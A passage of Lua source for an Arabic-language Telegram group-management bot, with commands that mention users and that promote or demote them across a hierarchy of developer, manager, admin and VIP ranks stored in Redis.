if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function WAAD(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(119541395) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end 
if tonumber(result.id_) == tonumber(WAAD) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local WAAD = {"صاࢪࢪ ستاذيي 🏃🏻‍♂️♥️","تأمࢪ آمࢪ","؏ـمـريـہٰ تدلل","شسالفهہ هسههہ اصيحه","هَـسۿ ، פـياتيہ"} 
Dev_AIAN(msg.chat_id_, msg.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'md') 
local WAAD = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لڪك @"..username.." ديصيحوك😐🖤",}
Dev_AIAN(msg.chat_id_, result.id_, 1,''..WAAD[math.random(#WAAD)]..'', 1, 'html') 
else  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,WAAD)
end
end
end
--     Source WAAD     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAIAN:sismember(WAAD..'AIAN:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAIAN:sismember(WAAD..'AIAN:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAIAN:sismember(WAAD..'AIAN:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAIAN:sismember(WAAD..'AIAN:VipAll:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAIAN:sismember(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_, result.sender_user_id_) then
lordConstructor = 'المالكين • ' else lordConstructor = '' end
if DevAIAN:sismember(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAIAN:sismember(WAAD..'AIAN:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAIAN:sismember(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevAIAN:sismember(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAIAN:sismember(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAIAN:sismember(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..sudobot..managerall..adminall..vpall..lordConstructor..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙لم تتم ترقيته مسبقا")  
end
if AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAIAN:srem(WAAD..'AIAN:SecondSudo:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:SudoBot:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:ManagerAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:AdminAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAIAN:srem(WAAD..'AIAN:SudoBot:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:ManagerAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:AdminAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAIAN:srem(WAAD..'AIAN:ManagerAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:AdminAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'AIANconstructor' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAIAN:sismember(WAAD..'AIAN:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAIAN:sismember(WAAD..'AIAN:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAIAN:sismember(WAAD..'AIAN:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAIAN:sismember(WAAD..'AIAN:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAIAN:sismember(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_, result.id_) then
lordConstructor = 'المالكين • ' else lordConstructor = '' end
if DevAIAN:sismember(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAIAN:sismember(WAAD..'AIAN:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAIAN:sismember(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevAIAN:sismember(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAIAN:sismember(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAIAN:sismember(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..sudobot..managerall..adminall..vpall..lordConstructor..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","⌯︙لم تتم ترقيته مسبقا")  
end 
if AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAIAN:srem(WAAD..'AIAN:SecondSudo:', result.id_)
DevAIAN:srem(WAAD..'AIAN:SudoBot:', result.id_)
DevAIAN:srem(WAAD..'AIAN:ManagerAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:AdminAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:VipAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAIAN:srem(WAAD..'AIAN:SudoBot:', result.id_)
DevAIAN:srem(WAAD..'AIAN:ManagerAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:AdminAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:VipAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAIAN:srem(WAAD..'AIAN:ManagerAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:AdminAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:VipAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'AIANconstructor' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_, result.id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
elseif AIANDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source WAAD     --
--     Set SecondSudo     --
if Sudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المطورين الثانويين\n")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المطورين الثانويين\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevAIAN:sadd(WAAD..'AIAN:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المطورين الثانويين\n")  
end
--     Source WAAD     --
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المطورين الثانويين\n✓")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and ChCheck(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المطورين الثانويين\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and ChCheck(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevAIAN:srem(WAAD..'AIAN:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المطورين الثانويين\n✓")  
end end
--     Source WAAD     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المطورين\n✓")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المطورين\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevAIAN:sadd(WAAD..'AIAN:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المطورين\n✓")  
end
--     Source WAAD     --
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and ChCheck(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المطورين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and ChCheck(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevAIAN:srem(WAAD..'AIAN:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المطورين\n✓")  
end end
--     Source WAAD     --
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('رفع مدير عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المدراء العامين\n✓")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المدراء العامين\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevAIAN:sadd(WAAD..'AIAN:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المدراء العامين\n✓")  
end
--     Source WAAD     --
--      Rem ManagerAll    --
if text ==('تنزيل مدير عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المدراء العامين\n✓")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المدراء العامين\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevAIAN:srem(WAAD..'AIAN:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المدراء العامين\n✓")  
end end
--     Source WAAD     --
--      Set adminall      --
if ManagerAll(msg) then
if text ==('رفع ادمن عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة الادمنيه العامين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevAIAN:sadd(WAAD..'AIAN:AdminAll:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة الادمنيه العامين\n✓")  
end
--     Source WAAD     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة الادمنيه العامين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAIAN:srem(WAAD..'AIAN:AdminAll:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة الادمنيه العامين\n✓")  
end end
--     Source WAAD     --
--       Set Vipall       --
if AdminAll(msg) then
if text ==('رفع مميز عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المميزين العام")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevAIAN:sadd(WAAD..'AIAN:VipAll:',user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المميزين العام\n✓")  
end
--     Source WAAD     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المميزين العام\n✓")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المميزين العام\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevAIAN:srem(WAAD..'AIAN:VipAll:',user)
